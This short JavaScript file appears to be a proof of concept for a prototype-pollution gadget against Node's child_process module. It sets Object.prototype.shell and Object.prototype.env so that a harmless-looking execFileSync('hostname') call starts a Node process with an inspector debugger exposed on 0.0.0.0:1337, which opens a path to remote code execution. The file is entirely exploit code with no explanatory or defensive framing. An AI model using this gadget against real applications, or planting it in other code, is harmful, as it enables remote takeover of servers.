
const { execFileSync } = require('child_process');

Object.prototype.shell = "node";
Object.prototype.env = { NODE_OPTIONS: '--inspect-brk=0.0.0.0:1337' };

const output = execFileSync('hostname', { });
console.log(output.toString());
